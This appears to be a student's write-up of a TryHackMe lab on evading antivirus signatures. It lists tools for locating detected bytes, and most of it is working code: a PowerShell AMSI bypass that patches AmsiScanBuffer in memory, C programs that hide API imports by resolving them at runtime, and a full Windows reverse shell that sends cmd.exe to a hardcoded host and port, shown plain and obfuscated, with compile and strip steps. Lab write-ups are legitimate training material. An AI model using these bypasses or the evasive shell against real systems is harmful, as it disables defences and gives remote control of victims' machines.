# Signature Evasion - Medium

1. [Signature Identification](#signature-identification)
2. [Automating Signature Identification](#automating-signature-identification)
3. [Static Code-Based Signatures](#static-code-based-signatures)
4. [Static Property-Based Signatures](#static-property-based-signatures)
5. [Behavioral Signatures](#behavioral-signatures)
6. [Putting It All Together](#putting-it-all-together)

## Signature Identification

* Signatures are used by AV engines to track & identify possible suspicious & malicious programs.

* When identifying signatures manually or automated, we must employ an iterative process to determine what byte a signature starts at (by recursively splitting compiled binary in half and testing it).

```shell
#example of splitting binary
ls -la
#shows binary size in bytes

head --bytes 29 example.exe > half.exe
#split the first half of binary into a new binary
#then we can move this newly-created half to the Windows machine and check

#we can also use an automated tool for this
#like ThreatCheck
#which gives us offset 0xC544, in decimal it is 50500
```

```markdown
1. To the nearest kibibyte, what is the first detected byte? - 51000
```

## Automating Signature Identification

* [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1):

```ps
#in powershell
. .\Find-AVSignature.ps1

Find-AVSignature
```

* ThreatCheck:

```shell
ThreatCheck.exe --help

#supply file and engine
#use AMSITrigger when dealing with AMSI
ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI
#this identifies bad bytes

ThreatCheck.exe -f ..\Binaries\shell.exe -e AMSI
```

* AMSITrigger:

```shell
amsitrigger.exe --help

.\amsitrigger.exe -i bypass.ps1 -f 3
#-f for format shown in help
```

```markdown
1. At what offset was the end of bad bytes for the file? - 0xC544
```

## Static Code-Based Signatures

* Once a bad signature is identified, it could be broken using simple obfuscation or through specific investigation.

* Obfuscating methods:

  * Method proxy
  * Method scattering/aggregation
  * Method clone

* Obfuscating classes:

  * Class hierarchy flattening
  * Class splitting/coalescing
  * Dropping modifiers

* Splitting & merging objects - create a new object function that can break the signature while maintaining the previous functionality.

* Removing & obscuring identifiable info - replacing strings with random identifiers with changing values; obscuring variable names.

* Given snippet:

```ps
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

* Obfuscated snippet:

```ps
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru;
$A = "Am" + "siSc" + "anBuf" + "fer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);

$buf = New-Object byte[] 6;
$buf[0] = [UInt32]0xB8;
$buf[1] = [UInt32]0x57;
$buf[2] = [UInt32]0x00;
$buf[3] = [UInt32]0x07;
$buf[4] = [UInt32]0x80;
$buf[5] = [UInt32]0xC3;

$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [UInt32]0x07, [UInt32]0x80, [UInt32]0xC3);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $BufferAddress, 6);
```

```markdown
1. What flag is found after uploading a properly obfuscated snippet? - THM{70_D373C7_0r_70_N07_D373C7}
```

## Static Property-Based Signatures

* File Hashes - if we have access to source of an application, we can modify arbitrary sections of code and re-compile it to create a new hash; when dealing with a signed or closed-source app, we must employ bit-flipping.

* Entropy - randomness of data in file used to determine whether file contains hidden data or suspicious scripts; to lower entropy we can replace random identifiers with random English words.

```markdown
1. Rounded to three decimal places, what is the Shannon entropy of the file? - 6.354
```

## Behavioral Signatures

* Given C program:

```c
#include <windows.h>
#include <stdio.h>
#include <lm.h>

int main() {
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (GetComputerNameA(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```

* Obfuscated C program:

```c
#include <stdio.h>
#include <lm.h>

typedef BOOL (WINAPI* myNotgetComputerNameA)(
    LPSTR   lpBuffer,
    LPDWORD nSize
);

int main() {
    HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
    myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, "GetComputerNameA");
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (GetComputerNameA(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```

```markdown
1. What flag is found after uploading a properly obfuscated snippet? - THM{N0_1MP0r75_F0r_Y0U}
```

## Putting It All Together

* Given program:

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";
        int port = 53;
        RunShell(host, port);
    }
    return 0;
} 
```

* Obfuscated program:

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS, LPQOS lpGQOS);
typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);

void RunShell(char* C2Server, int C2Port) {

        HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
        WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32,"WSAConnect");
        WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
        WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
        INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
        HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
        CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
        WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup"); 

        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        myWSAStartup(MAKEWORD(2,2), &version);
        mySocket = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = myinet_addr(C2Server);
        addr.sin_port = myhtons(C2Port);

        if (myWSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            myclosesocket(mySocket);
            myWSACleanup();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Nature[] = "cmd.exe";
            STARTUPINFO project;
            PROCESS_INFORMATION hammer;
            memset(&project, 0, sizeof(project));
            project.cb = sizeof(project);
            project.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            project.hStdInput = project.hStdOutput = project.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Nature, NULL, NULL, TRUE, 0, NULL, NULL, &project, &hammer);

            printf("Process Created %lu\\n", hammer.dwProcessId);

            WaitForSingleObject(hammer.hProcess, INFINITE);
            CloseHandle(hammer.hProcess);
            CloseHandle(hammer.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.45.243";
        int port = 4444;
        RunShell(host, port);
    }
    return 0;
} 
```

```shell
#after adding structure defs
#and pointer defs
#using dynamic loading
#and obfuscating variable names

x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32

#remove symbols from compiled binary
strip --strip-all challenge.exe

nm challenge.exe

#setup listener and upload .exe to given link
#if success, we will get a shell
```

```markdown
1. What is the flag found on the Administrator desktop? - THM{08FU5C4710N_15 MY_10V3_14N6U463}
```
